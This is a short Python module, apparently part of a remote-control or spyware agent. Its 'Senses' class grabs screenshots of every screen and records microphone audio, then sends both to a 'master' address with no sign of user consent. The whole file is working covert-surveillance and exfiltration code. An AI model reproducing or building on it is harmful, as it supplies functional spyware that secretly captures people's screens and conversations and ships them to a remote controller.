import io
import os
import time
import numpy as np
from scipy.io import wavfile
import sounddevice as sd
from PIL import ImageGrab


class Senses:
    def __init__(self):
        # Does not need to create variables
        pass

    @staticmethod
    def see_screen(master, address):
        # Capture the screen state
        screenshot = ImageGrab.grab(include_layered_windows=True, all_screens=True)

        # Convert the screen state to PIL Image
        screen_state = screenshot.copy()

        # Get the current timestamp
        current_time = time.localtime()
        timestamp = time.strftime("%d-%m-%y_%H-%M", current_time)

        # Convert the screen state image to bytes
        image_bytes = io.BytesIO()
        screen_state.save(image_bytes, format='PNG')
        image_bytes = image_bytes.getvalue()

        # Generate the file name
        file_name = f'screenshot_{timestamp}.png'

        # Send the file data to the master
        master.send_file_to_master(address, file_name, image_bytes)

    def hear_audio(self, master, address, duration=30):
        fs = 44100
        channels = 2

        # Record audio
        print("Recording...")
        audio_data = self._record_audio_in_memory(fs, channels, duration)
        print("Recording completed")

        current_time = time.localtime()
        timestamp = time.strftime("%d-%m-%y_%H-%M-%S", current_time)

        # Create an in-memory file-like object for WAV
        audio_buffer = io.BytesIO()
        wavfile.write(audio_buffer, fs, audio_data)

        # Send the audio data to the master
        file_name = f"record_{timestamp}.wav"
        master.send_file_to_master(address, file_name, audio_buffer.getvalue())
        print("Audio data sent to the master")

    @staticmethod
    def _record_audio_in_memory(fs, channels, duration):
        audio_data = sd.rec(int(duration * fs), samplerate=fs, channels=channels, dtype=np.int16)
        sd.wait()  # Wait for the recording to finish
        return audio_data
